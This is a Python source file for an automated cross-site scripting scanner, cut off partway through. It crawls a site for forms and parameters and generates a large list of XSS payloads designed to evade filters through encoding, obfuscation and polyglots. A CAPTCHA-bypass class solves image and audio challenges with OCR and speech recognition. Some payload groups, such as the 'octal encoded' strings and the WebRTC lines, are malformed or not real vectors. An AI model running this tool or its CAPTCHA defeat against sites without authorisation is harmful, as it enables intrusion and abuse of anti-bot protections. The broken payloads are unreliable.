import requests
import argparse
import json
import time
import sys
import urllib3
import colorama
import random
import string
from datetime import datetime
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Style
from urllib3.util.retry import Retry
import pytesseract
from PIL import Image
import io
import base64
import re
import signal

# Try to import speech recognition, but don't fail if not available
try:
    import speech_recognition as sr
    SPEECH_RECOGNITION_AVAILABLE = True
except ImportError:
    SPEECH_RECOGNITION_AVAILABLE = False
    print(f"{Fore.YELLOW}[!] Speech recognition not available. Audio CAPTCHA solving will be disabled.{Style.RESET_ALL}")

# Import enhanced modules
try:
    from response_analyzer import ResponseAnalyzer
    from report_generator import ReportGenerator
except ImportError:
    print(f"{Fore.YELLOW}[!] Response analyzer or report generator not available. Some features may be limited.{Style.RESET_ALL}")

from requests.adapters import HTTPAdapter
from urllib3.exceptions import InsecureRequestWarning

# Initialize colorama
init()

# Suppress only the single InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)

# Configure retry strategy
retry_strategy = Retry(
    total=5,
    backoff_factor=2,
    status_forcelist=[500, 502, 503, 504, 429],
    allowed_methods=['GET', 'POST'],
    respect_retry_after_header=True
)

# Global variables to store results
successful_payloads = {'url_params': [], 'forms': []}
report_gen = None

class PayloadGenerator:
    def __init__(self):
        self.payloads = []
        self.contexts = ['html', 'attribute', 'javascript', 'url', 'css', 'xml', 'json', 'markdown']
        self.encodings = ['none', 'url', 'html', 'js', 'unicode', 'base64', 'hex', 'octal']
        self.bypass_techniques = ['case_variation', 'whitespace', 'comments', 'null_bytes', 'encoding', 
                                'double_encoding', 'unicode_normalization', 'obfuscation', 'template_literals']
        
    def generate_all_payloads(self):
        """Generate a comprehensive set of XSS payloads"""
        self.payloads = []
        
        # Basic payloads
        self._add_basic_payloads()
        
        # Context-specific payloads
        self._add_context_specific_payloads()
        
        # Bypass payloads
        self._add_bypass_payloads()
        
        # Polyglot payloads
        self._add_polyglot_payloads()
        
        # DOM-based payloads
        self._add_dom_payloads()
        
        # SVG payloads
        self._add_svg_payloads()
        
        # Event handler payloads
        self._add_event_handler_payloads()
        
        # Custom encoding payloads
        self._add_encoded_payloads()
        
        # Advanced bypass payloads
        self._add_advanced_bypass_payloads()
        
        # Template literal payloads
        self._add_template_literal_payloads()
        
        # Markdown payloads
        self._add_markdown_payloads()
        
        # JSON payloads
        self._add_json_payloads()
        
        # XML payloads
        self._add_xml_payloads()
        
        # CSS injection payloads
        self._add_css_injection_payloads()
        
        # MIME type confusion payloads
        self._add_mime_confusion_payloads()
        
        # Dynamic import payloads
        self._add_dynamic_import_payloads()
        
        # WebSocket payloads
        self._add_websocket_payloads()
        
        # Service Worker payloads
        self._add_service_worker_payloads()
        
        # WebRTC payloads
        self._add_webrtc_payloads()
        
        return self.payloads
    
    def _add_basic_payloads(self):
        """Add basic XSS payloads"""
        basics = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<iframe src=javascript:alert(1)>',
            '<a href=javascript:alert(1)>click</a>',
            '<div onmouseover=alert(1)>hover</div>',
            '<input type=image src=1 onerror=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<details open ontoggle=alert(1)>'
        ]
        self.payloads.extend(basics)
    
    def _add_context_specific_payloads(self):
        """Add context-specific payloads"""
        # HTML context
        html_payloads = [
            '"><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '"><svg onload=alert(1)>',
            '"><iframe src=javascript:alert(1)>',
            '"><body onload=alert(1)>'
        ]
        
        # Attribute context
        attr_payloads = [
            '" onmouseover=alert(1) x="',
            '" onfocus=alert(1) autofocus="',
            '" onload=alert(1) src=x"',
            '" onerror=alert(1) src=x"',
            '" style="x:expression(alert(1))"'
        ]
        
        # JavaScript context
        js_payloads = [
            ';alert(1)//',
            'alert(1)//',
            'alert(1);',
            'alert(1)',
            'alert`1`',
            'alert(1)',
            'alert(1)',
            'alert(1)',
            'alert(1)',
            'alert(1)'
        ]
        
        # URL context
        url_payloads = [
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'vbscript:alert(1)',
            'data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4='
        ]
        
        # CSS context
        css_payloads = [
            'expression(alert(1))',
            'javascript:alert(1)',
            'url(javascript:alert(1))',
            'background-image:url("javascript:alert(1)")',
            'background:url("javascript:alert(1)")'
        ]
        
        self.payloads.extend(html_payloads + attr_payloads + js_payloads + url_payloads + css_payloads)
    
    def _add_bypass_payloads(self):
        """Add payloads with various bypass techniques"""
        # Case variation
        case_variations = [
            '<ScRiPt>alert(1)</ScRiPt>',
            '<IMG SRC=x ONERROR=alert(1)>',
            '<sCriPt>alert(1)</sCriPt>',
            '<iMg SrC=x OnErRoR=alert(1)>',
            '<sVg OnLoAd=alert(1)>'
        ]
        
        # Whitespace variations
        whitespace_variations = [
            '<script>alert(1)</script >',
            '<script >alert(1)</script>',
            '<script\t>alert(1)</script>',
            '<script\n>alert(1)</script>',
            '<script\r>alert(1)</script>'
        ]
        
        # Comment variations
        comment_variations = [
            '<!--><script>alert(1)</script>',
            '<script><!-->alert(1)</script>',
            '<script>alert(1)<!--</script>',
            '<!--<script>alert(1)</script>-->',
            '<script>/*alert(1)*/</script>'
        ]
        
        # Null byte variations
        null_byte_variations = [
            '<script>alert(1)\0</script>',
            '<script\0>alert(1)</script>',
            '<script>alert(1)</script\0>',
            '<script>alert(1)\0</script>',
            '<script>alert(1)</script>\0'
        ]
        
        self.payloads.extend(case_variations + whitespace_variations + comment_variations + null_byte_variations)
    
    def _add_polyglot_payloads(self):
        """Add polyglot payloads that work in multiple contexts"""
        polyglots = [
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e',
            '"><img src=x onerror=alert(1)>',
            '"><svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            '"><body onload=alert(1)>'
        ]
        self.payloads.extend(polyglots)
    
    def _add_dom_payloads(self):
        """Add DOM-based XSS payloads"""
        dom_payloads = [
            '<img src=x onerror=eval(atob(\'YWxlcnQoMSk=\'))>',
            '<svg onload=eval(atob(\'YWxlcnQoMSk=\'))>',
            '<script>eval(atob(\'YWxlcnQoMSk=\'))</script>',
            '<img src=x onerror=Function(atob(\'YWxlcnQoMSk=\'))()>',
            '<svg onload=Function(atob(\'YWxlcnQoMSk=\'))()>'
        ]
        self.payloads.extend(dom_payloads)
    
    def _add_svg_payloads(self):
        """Add SVG-based XSS payloads"""
        svg_payloads = [
            '<svg><script>alert(1)</script></svg>',
            '<svg><script>alert(1)</script></svg>',
            '<svg><script>alert(1)</script></svg>',
            '<svg><script>alert(1)</script></svg>',
            '<svg><script>alert(1)</script></svg>'
        ]
        self.payloads.extend(svg_payloads)
    
    def _add_event_handler_payloads(self):
        """Add event handler-based XSS payloads"""
        events = [
            'onload', 'onerror', 'onmouseover', 'onclick', 'onfocus',
            'onblur', 'onkeypress', 'onkeydown', 'onkeyup', 'onsubmit'
        ]
        
        for event in events:
            self.payloads.extend([
                f'<img src=x {event}=alert(1)>',
                f'<div {event}=alert(1)>hover</div>',
                f'<input type=text {event}=alert(1)>',
                f'<a href=# {event}=alert(1)>click</a>',
                f'<body {event}=alert(1)>'
            ])
    
    def _add_encoded_payloads(self):
        """Add encoded XSS payloads"""
        # Basic URL encoded payloads
        basic_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<iframe src=javascript:alert(1)>',
            '<a href=javascript:alert(1)>click</a>',
            '<div onmouseover=alert(1)>hover</div>',
            '<input type=image src=1 onerror=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<details open ontoggle=alert(1)>'
        ]
        
        # Double URL encoded payloads
        double_encoded = [
            '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
            '%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E',
            '%253Csvg%2520onload%253Dalert(1)%253E',
            '%253Cbody%2520onload%253Dalert(1)%253E',
            '%253Ciframe%2520src%253Djavascript%253Aalert(1)%253E',
            '%253Ca%2520href%253Djavascript%253Aalert(1)%253Eclick%253C%252Fa%253E',
            '%253Cdiv%2520onmouseover%253Dalert(1)%253Ehover%253C%252Fdiv%253E',
            '%253Cinput%2520type%253Dimage%2520src%253D1%2520onerror%253Dalert(1)%253E',
            '%253Cmarquee%2520onstart%253Dalert(1)%253E',
            '%253Cdetails%2520open%2520ontoggle%253Dalert(1)%253E'
        ]
        
        # Triple URL encoded payloads
        triple_encoded = [
            '%2525253Cscript%2525253Ealert(1)%2525253C%2525252Fscript%2525253E',
            '%2525253Cimg%25252520src%2525253Dx%25252520onerror%2525253Dalert(1)%2525253E',
            '%2525253Csvg%25252520onload%2525253Dalert(1)%2525253E',
            '%2525253Cbody%25252520onload%2525253Dalert(1)%2525253E',
            '%2525253Ciframe%25252520src%2525253Djavascript%2525253Aalert(1)%2525253E',
            '%2525253Ca%25252520href%2525253Djavascript%2525253Aalert(1)%2525253Eclick%2525253C%2525252Fa%2525253E',
            '%2525253Cdiv%25252520onmouseover%2525253Dalert(1)%2525253Ehover%2525253C%2525252Fdiv%2525253E',
            '%2525253Cinput%25252520type%2525253Dimage%25252520src%2525253D1%25252520onerror%2525253Dalert(1)%2525253E',
            '%2525253Cmarquee%25252520onstart%2525253Dalert(1)%2525253E',
            '%2525253Cdetails%25252520open%25252520ontoggle%2525253Dalert(1)%2525253E'
        ]
        
        # Mixed encoding payloads
        mixed_encoded = [
            '%3Cscript%3Ealert%281%29%3C%2Fscript%3E',
            '%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E',
            '%3Csvg%20onload%3Dalert%281%29%3E',
            '%3Cbody%20onload%3Dalert%281%29%3E',
            '%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E',
            '%3Ca%20href%3Djavascript%3Aalert%281%29%3Eclick%3C%2Fa%3E',
            '%3Cdiv%20onmouseover%3Dalert%281%29%3Ehover%3C%2Fdiv%3E',
            '%3Cinput%20type%3Dimage%20src%3D1%20onerror%3Dalert%281%29%3E',
            '%3Cmarquee%20onstart%3Dalert%281%29%3E',
            '%3Cdetails%20open%20ontoggle%3Dalert%281%29%3E'
        ]
        
        # Partial encoding payloads
        partial_encoded = [
            '<script>alert%281%29</script>',
            '<img src=x onerror=alert%281%29>',
            '<svg onload=alert%281%29>',
            '<body onload=alert%281%29>',
            '<iframe src=javascript%3Aalert(1)>',
            '<a href=javascript%3Aalert(1)>click</a>',
            '<div onmouseover=alert%281%29>hover</div>',
            '<input type=image src=1 onerror=alert%281%29>',
            '<marquee onstart=alert%281%29>',
            '<details open ontoggle=alert%281%29>'
        ]
        
        # Unicode encoded payloads
        unicode_encoded = [
            '%u003Cscript%u003Ealert(1)%u003C/script%u003E',
            '%u003Cimg%u0020src%u003Dx%u0020onerror%u003Dalert(1)%u003E',
            '%u003Csvg%u0020onload%u003Dalert(1)%u003E',
            '%u003Cbody%u0020onload%u003Dalert(1)%u003E',
            '%u003Ciframe%u0020src%u003Djavascript%u003Aalert(1)%u003E',
            '%u003Ca%u0020href%u003Djavascript%u003Aalert(1)%u003Eclick%u003C/a%u003E',
            '%u003Cdiv%u0020onmouseover%u003Dalert(1)%u003Ehover%u003C/div%u003E',
            '%u003Cinput%u0020type%u003Dimage%u0020src%u003D1%u0020onerror%u003Dalert(1)%u003E',
            '%u003Cmarquee%u0020onstart%u003Dalert(1)%u003E',
            '%u003Cdetails%u0020open%u0020ontoggle%u003Dalert(1)%u003E'
        ]
        
        # Hex encoded payloads
        hex_encoded = [
            '%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E',
            '%3C%69%6D%67%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%61%6C%65%72%74%28%31%29%3E',
            '%3C%73%76%67%20%6F%6E%6C%6F%61%64%3D%61%6C%65%72%74%28%31%29%3E',
            '%3C%62%6F%64%79%20%6F%6E%6C%6F%61%64%3D%61%6C%65%72%74%28%31%29%3E',
            '%3C%69%66%72%61%6D%65%20%73%72%63%3D%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29%3E',
            '%3C%61%20%68%72%65%66%3D%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29%3E%63%6C%69%63%6B%3C%2F%61%3E',
            '%3C%64%69%76%20%6F%6E%6D%6F%75%73%65%6F%76%65%72%3D%61%6C%65%72%74%28%31%29%3E%68%6F%76%65%72%3C%2F%64%69%76%3E',
            '%3C%69%6E%70%75%74%20%74%79%70%65%3D%69%6D%61%67%65%20%73%72%63%3D%31%20%6F%6E%65%72%72%6F%72%3D%61%6C%65%72%74%28%31%29%3E',
            '%3C%6D%61%72%71%75%65%65%20%6F%6E%73%74%61%72%74%3D%61%6C%65%72%74%28%31%29%3E',
            '%3C%64%65%74%61%69%6C%73%20%6F%70%65%6E%20%6F%6E%74%6F%67%67%6C%65%3D%61%6C%65%72%74%28%31%29%3E'
        ]
        
        # Octal encoded payloads
        octal_encoded = [
            '%74%70%74%3E%141%154%145%162%164%50%61%74%74%162%50%51%51%74%3C%57%164%160%164%3E',
            '%74%155%147%40%163%162%143%75%170%40%157%156%145%162%162%157%162%75%141%154%145%162%164%50%61%51%76%3E',
            '%74%163%166%147%40%157%156%154%157%141%144%75%141%154%145%162%164%50%61%51%76%3E',
            '%74%142%157%144%171%40%157%156%154%157%141%144%75%141%154%145%162%164%50%61%51%76%3E',
            '%74%151%146%162%141%155%145%40%163%162%143%75%152%141%166%141%163%143%162%151%160%164%72%141%154%145%162%164%50%61%51%76%3E',
            '%74%141%40%150%162%145%146%75%152%141%166%141%163%143%162%151%160%164%72%141%154%145%162%164%50%61%51%76%143%154%151%143%153%74%57%141%76%3E',
            '%74%144%151%166%40%157%156%155%157%165%163%145%157%166%145%162%75%141%154%145%162%164%50%61%51%76%150%157%166%145%162%74%57%144%151%166%76%3E',
            '%74%151%156%160%165%164%40%164%171%160%145%75%151%155%141%147%145%40%163%162%143%75%61%40%157%156%145%162%162%157%162%75%141%154%145%162%164%50%61%51%76%3E',
            '%74%155%141%162%161%165%145%145%40%157%156%163%164%141%162%164%75%141%154%145%162%164%50%61%51%76%3E',
            '%74%144%145%164%141%151%154%163%40%157%160%145%156%40%157%156%164%157%147%147%154%145%75%141%154%145%162%164%50%61%51%76%3E'
        ]
        
        # Mixed encoding with special characters
        special_chars_encoded = [
            '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
            '%3Cimg%20src%3D%22x%22%20onerror%3Dalert%28%22XSS%22%29%3E',
            '%3Csvg%20onload%3Dalert%28%22XSS%22%29%3E',
            '%3Cbody%20onload%3Dalert%28%22XSS%22%29%3E',
            '%3Ciframe%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E',
            '%3Ca%20href%3D%22javascript%3Aalert%28%27XSS%27%29%22%3Eclick%3C%2Fa%3E',
            '%3Cdiv%20onmouseover%3Dalert%28%22XSS%22%29%3Ehover%3C%2Fdiv%3E',
            '%3Cinput%20type%3D%22image%22%20src%3D%221%22%20onerror%3Dalert%28%22XSS%22%29%3E',
            '%3Cmarquee%20onstart%3Dalert%28%22XSS%22%29%3E',
            '%3Cdetails%20open%20ontoggle%3Dalert%28%22XSS%22%29%3E'
        ]
        
        # Combine all encoded payloads
        self.payloads.extend(
            basic_payloads + 
            double_encoded + 
            triple_encoded + 
            mixed_encoded + 
            partial_encoded + 
            unicode_encoded + 
            hex_encoded + 
            octal_encoded + 
            special_chars_encoded
        )
    
    def _random_string(self, length=8):
        """Generate a random string for dynamic payloads"""
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
    
    def _add_advanced_bypass_payloads(self):
        """Add advanced bypass techniques"""
        # Double encoding
        double_encoded = [
            '%2522%253E%253Cscript%253Ealert(1)%253C%252Fscript%253E',
            '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
            '%2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E',
            '%2522%253E%253Csvg%2520onload%253Dalert(1)%253E',
            '%2522%253E%253Cbody%2520onload%253Dalert(1)%253E'
        ]
        
        # Unicode normalization
        unicode_normalized = [
            '\uFEFF<script>alert(1)</script>',
            '\u200B<script>alert(1)</script>',
            '\u200C<script>alert(1)</script>',
            '\u200D<script>alert(1)</script>',
            '\u2060<script>alert(1)</script>'
        ]
        
        # Obfuscation techniques
        obfuscated = [
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
            '<script>eval(unescape(/%61%6c%65%72%74%28%31%29/))</script>',
            '<script>eval(atob(\'YWxlcnQoMSk=\'))</script>',
            '<script>eval(\\u0061\\u006c\\u0065\\u0072\\u0074(1))</script>',
            '<script>eval(\\x61\\x6c\\u0065\\u0072\\u0074(1))</script>'
        ]
        
        self.payloads.extend(double_encoded + unicode_normalized + obfuscated)
    
    def _add_template_literal_payloads(self):
        """Add template literal-based payloads"""
        template_literals = [
            '`${alert(1)}`',
            '`${Function(\'alert(1)\')()}`',
            '`${eval(\'alert(1)\')}`',
            '`${[].constructor.constructor(\'alert(1)\')()}`',
            '`${setTimeout(\'alert(1)\')}`'
        ]
        self.payloads.extend(template_literals)
    
    def _add_markdown_payloads(self):
        """Add markdown-specific payloads"""
        markdown_payloads = [
            '[XSS](javascript:alert(1))',
            '![XSS](javascript:alert(1))',
            '```javascript\nalert(1)\n```',
            '<script>alert(1)</script>',
            '![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)'
        ]
        self.payloads.extend(markdown_payloads)
    
    def _add_json_payloads(self):
        """Add JSON-specific payloads"""
        json_payloads = [
            '{"x":"</script><script>alert(1)</script>"}',
            '{"x":"\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E"}',
            '{"x":"\\u0022\\u003E\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E"}',
            '{"x":"\\u003Cimg src=x onerror=alert(1)\\u003E"}',
            '{"x":"\\u003Csvg onload=alert(1)\\u003E"}'
        ]
        self.payloads.extend(json_payloads)
    
    def _add_xml_payloads(self):
        """Add XML-specific payloads"""
        xml_payloads = [
            '<?xml version="1.0"?><script>alert(1)</script>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "javascript:alert(1)">]><foo>&xxe;</foo>',
            '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
            '<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>',
            '<![CDATA[<script>alert(1)</script>]]>'
        ]
        self.payloads.extend(xml_payloads)
    
    def _add_css_injection_payloads(self):
        """Add advanced CSS injection payloads"""
        css_payloads = [
            'background-image:url("javascript:alert(1)")',
            'background:url("javascript:alert(1)")',
            'list-style-image:url("javascript:alert(1)")',
            'cursor:url("javascript:alert(1)")',
            'border-image:url("javascript:alert(1)")',
            'content:url("javascript:alert(1)")',
            'mask-image:url("javascript:alert(1)")',
            'filter:url("javascript:alert(1)")',
            'clip-path:url("javascript:alert(1)")',
            'shape-outside:url("javascript:alert(1)")'
        ]
        self.payloads.extend(css_payloads)
    
    def _add_mime_confusion_payloads(self):
        """Add MIME type confusion payloads"""
        mime_payloads = [
            'data:text/html,<script>alert(1)</script>',
            'data:text/javascript,alert(1)',
            'data:application/x-javascript,alert(1)',
            'data:application/javascript,alert(1)',
            'data:text/plain,<script>alert(1)</script>',
            'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
            'data:text/css,.x{background-image:url("javascript:alert(1)")}',
            'data:application/json,{"x":"</script><script>alert(1)</script>"}',
            'data:text/xml,<?xml version="1.0"?><script>alert(1)</script>',
            'data:application/xml,<?xml version="1.0"?><script>alert(1)</script>'
        ]
        self.payloads.extend(mime_payloads)
    
    def _add_dynamic_import_payloads(self):
        """Add dynamic import payloads"""
        dynamic_imports = [
            'import("data:text/javascript,alert(1)")',
            'import(`data:text/javascript,${alert(1)}`)',
            'import("javascript:alert(1)")',
            'import(`javascript:${alert(1)}`)',
            'import("data:application/javascript,alert(1)")'
        ]
        self.payloads.extend(dynamic_imports)
    
    def _add_websocket_payloads(self):
        """Add WebSocket-based payloads"""
        websocket_payloads = [
            'ws://localhost:8080/alert(1)',
            'wss://localhost:8080/alert(1)',
            'new WebSocket("ws://localhost:8080/alert(1)")',
            'new WebSocket(`ws://localhost:8080/${alert(1)}`)',
            'WebSocket.prototype.send = function(data) { alert(1); }'
        ]
        self.payloads.extend(websocket_payloads)
    
    def _add_service_worker_payloads(self):
        """Add Service Worker-based payloads"""
        service_worker_payloads = [
            'navigator.serviceWorker.register("data:text/javascript,alert(1)")',
            'navigator.serviceWorker.register(`data:text/javascript,${alert(1)}`)',
            'navigator.serviceWorker.register("javascript:alert(1)")',
            'navigator.serviceWorker.register(`javascript:${alert(1)}`)',
            'navigator.serviceWorker.register("data:application/javascript,alert(1)")'
        ]
        self.payloads.extend(service_worker_payloads)
    
    def _add_webrtc_payloads(self):
        """Add WebRTC-based payloads"""
        webrtc_payloads = [
            'new RTCPeerConnection({"iceServers":[{"urls":"javascript:alert(1)"}]})',
            'new RTCPeerConnection({"iceServers":[{"urls":`javascript:${alert(1)}`}]})',
            'new RTCPeerConnection({"iceServers":[{"urls":"data:text/javascript,alert(1)"}]})',
            'new RTCPeerConnection({"iceServers":[{"urls":`data:text/javascript,${alert(1)}`}]})',
            'RTCPeerConnection.prototype.createDataChannel = function() { alert(1); }'
        ]
        self.payloads.extend(webrtc_payloads)

class WebCrawler:
    def __init__(self, base_url, max_depth=3, max_urls=100, threads=10, verify_ssl=True, timeout=30):
        self.base_url = base_url
        self.max_depth = max_depth
        self.max_urls = max_urls
        self.threads = threads
        self.verify_ssl = verify_ssl
        self.timeout = timeout
        
        # Initialize session
        self.session = create_session(verify_ssl=verify_ssl, timeout=timeout)
        
        # Initialize tracking variables
        self.visited_urls = set()
        self.forms_found = []
        self.parameters_found = set()
        
    def crawl(self):
        """Main crawling function"""
        print(f"{Fore.CYAN}[*] Starting crawl from {self.base_url}{Style.RESET_ALL}")
        
        # Start with base URL
        self._crawl_url(self.base_url, depth=0)
        
        print(f"{Fore.GREEN}[+] Crawl completed{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Visited {len(self.visited_urls)} URLs{Style.RESET_ALL}")
        
    def _crawl_url(self, url, depth):
        """Crawl a single URL and its links"""
        if depth > self.max_depth or len(self.visited_urls) >= self.max_urls:
            return
            
        if url in self.visited_urls:
            return
            
        self.visited_urls.add(url)
        print(f"{Fore.CYAN}[*] Crawling: {url}{Style.RESET_ALL}")
        
        try:
            response = self.session.get(url, verify=self.verify_ssl, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract forms
            self._extract_forms(url, soup)
            
            # Extract parameters from URL
            self._extract_parameters(url)
            
            # Find and crawl links
            if depth < self.max_depth:
                for link in soup.find_all('a', href=True):
                    next_url = urljoin(url, link['href'])
                    if self._is_valid_url(next_url):
                        self._crawl_url(next_url, depth + 1)
                        
        except Exception as e:
            print(f"{Fore.RED}[-] Error crawling {url}: {str(e)}{Style.RESET_ALL}")
            
    def _extract_forms(self, url, soup):
        """Extract forms from the page"""
        for form in soup.find_all('form'):
            form_data = {
                'action': urljoin(url, form.get('action', '')),
                'method': form.get('method', 'get').upper(),
                'inputs': []
            }
            
            for input_field in form.find_all(['input', 'textarea']):
                form_data['inputs'].append({
                    'name': input_field.get('name', ''),
                    'type': input_field.get('type', 'text')
                })
                
            self.forms_found.append(form_data)
            
    def _extract_parameters(self, url):
        """Extract parameters from URL"""
        parsed = urlparse(url)
        if parsed.query:
            params = parsed.query.split('&')
            for param in params:
                if '=' in param:
                    name = param.split('=')[0]
                    self.parameters_found.add(name)
                    
    def _is_valid_url(self, url):
        """Check if URL is valid for crawling"""
        parsed = urlparse(url)
        return (
            parsed.scheme in ['http', 'https'] and
            parsed.netloc == urlparse(self.base_url).netloc
        )
        
    def extract_parameters(self, url):
        """Extract parameters from a URL for testing"""
        params = {}
        parsed = urlparse(url)
        if parsed.query:
            for param in parsed.query.split('&'):
                if '=' in param:
                    name, value = param.split('=', 1)
                    params[name] = value
        return params

# Create a session with the retry strategy
def create_session(verify_ssl=True, timeout=30, user_agent=None):
    session = requests.Session()
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_maxsize=100)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    session.verify = verify_ssl
    if user_agent:
        session.headers.update({'User-Agent': user_agent})
    return session

def load_payloads(filename=None):
    """Load XSS payloads from file or generate advanced payloads"""
    payloads = []
    
    # Load custom payloads if provided
    if filename:
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                payloads.extend(line.strip() for line in f if line.strip() and not line.startswith('#'))
        except Exception as e:
            print(f"{Fore.RED}[-] Error loading custom payloads: {str(e)}{Style.RESET_ALL}")
    
    # Add advanced payloads
    try:
        payload_gen = PayloadGenerator()
        payloads.extend(payload_gen.generate_all_payloads())
        print(f"{Fore.GREEN}[+] Generated {len(payloads)} advanced payloads{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error generating advanced payloads: {str(e)}{Style.RESET_ALL}")
    
    return list(set(payloads))  # Remove duplicates

def get_all_inputs(url, verify_ssl=True):
    try:
        session = create_session(verify_ssl=verify_ssl)
        r = session.get(url)
        soup = BeautifulSoup(r.text, 'html.parser')
        
        # Find all forms
        forms = soup.find_all('form')
        inputs = []
        
        for form in forms:
            form_inputs = {
                'action': form.get('action', ''),
                'method': form.get('method', 'get').upper(),
                'inputs': []
            }
            
            # Get all input fields
            for input_field in form.find_all(['input', 'textarea']):
                form_inputs['inputs'].append({
                    'name': input_field.get('name', ''),
                    'type': input_field.get('type', 'text')
                })
            
            inputs.append(form_inputs)
            
        return inputs
    except Exception as e:
        print(f"{Fore.RED}[-] Error getting inputs from {url}: {str(e)}{Style.RESET_ALL}")
        return []

class CaptchaBypass:
    def __init__(self, session=None):
        self.session = session or create_session()
        self.captcha_solving_services = {
            '2captcha': 'YOUR_2CAPTCHA_API_KEY',
            'anticaptcha': 'YOUR_ANTICAPTCHA_API_KEY'
        }
        
        # Initialize speech recognition if available
        if SPEECH_RECOGNITION_AVAILABLE:
            self.recognizer = sr.Recognizer()
        else:
            self.recognizer = None

    def detect_captcha(self, response):
        """Detect if a page contains CAPTCHA"""
        captcha_indicators = [
            'captcha',
            'recaptcha',
            'hcaptcha',
            'turnstile',
            'cloudflare',
            'security check',
            'verify you are human',
            'verify you are not a robot'
        ]
        
        soup = BeautifulSoup(response.text, 'html.parser')
        text_content = soup.get_text().lower()
        
        # Check for CAPTCHA indicators in text
        for indicator in captcha_indicators:
            if indicator in text_content:
                return True
                
        # Check for common CAPTCHA elements
        captcha_elements = soup.find_all(['img', 'iframe', 'div'], class_=lambda x: x and any(indicator in str(x).lower() for indicator in captcha_indicators))
        if captcha_elements:
            return True
            
        return False
        
    def solve_image_captcha(self, image_data):
        """Solve image-based CAPTCHA using OCR"""
        try:
            # Convert image data to PIL Image
            if isinstance(image_data, str):
                if image_data.startswith('data:image'):
                    # Handle base64 encoded image
                    image_data = base64.b64decode(image_data.split(',')[1])
                else:
                    # Handle URL
                    response = self.session.get(image_data)
                    image_data = response.content
                    
            image = Image.open(io.BytesIO(image_data))
            
            # Preprocess image for better OCR
            image = image.convert('L')  # Convert to grayscale
            image = image.point(lambda x: 0 if x < 128 else 255, '1')  # Convert to binary
            
            # Perform OCR
            text = pytesseract.image_to_string(image)
            return text.strip()
            
        except Exception as e:
            print(f"{Fore.RED}[-] Error solving image CAPTCHA: {str(e)}{Style.RESET_ALL}")
            return None
            
    def solve_audio_captcha(self, audio_url):
        """Solve audio CAPTCHA using speech recognition"""
        if not SPEECH_RECOGNITION_AVAILABLE:
            print(f"{Fore.YELLOW}[!] Speech recognition not available. Cannot solve audio CAPTCHA.{Style.RESET_ALL}")
            return None
            
        try:
            # Download audio file
            response = self.session.get(audio_url)
            audio_data = response.content
            
            # Save to temporary file
            with open('temp_audio.wav', 'wb') as f:
                f.write(audio_data)
                
            # Use speech recognition
            with sr.AudioFile('temp_audio.wav') as source:
                audio = self.recognizer.record(source)
                text = self.recognizer.recognize_google(audio)
                return text.strip()
                
        except Exception as e:
            print(f"{Fore.RED}[-] Error solving audio CAPTCHA: {str(e)}{Style.RESET_ALL}")
            return None
            
    def bypass_captcha(self, response, url):
        """Main method to bypass CAPTCHA"""
        if not self.detect_captcha(response):
            return response
            
        print(f"{Fore.YELLOW}[*] CAPTCHA detected, attempting to bypass...{Style.RESET_ALL}")
        
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Try to find and solve image CAPTCHA
        captcha_images = soup.find_all('img', src=lambda x: x and ('captcha' in x.lower() or 'verify' in x.lower()))
        for img in captcha_images:
            solution = self.solve_image_captcha(img['src'])
            if solution:
                # Submit the solution
                form = img.find_parent('form')
                if form:
                    form_data = {input_.get('name', ''): input_.get('value', '') for input_ in form.find_all('input')}
                    form_data[img.get('name', 'captcha')] = solution
                    response = self.session.post(form['action'], data=form_data)
                    return response
                    
        # Try to find and solve audio CAPTCHA
        audio_links = soup.find_all('a', href=lambda x: x and ('audio' in x.lower() or 'sound' in x.lower()))
        for link in audio_links:
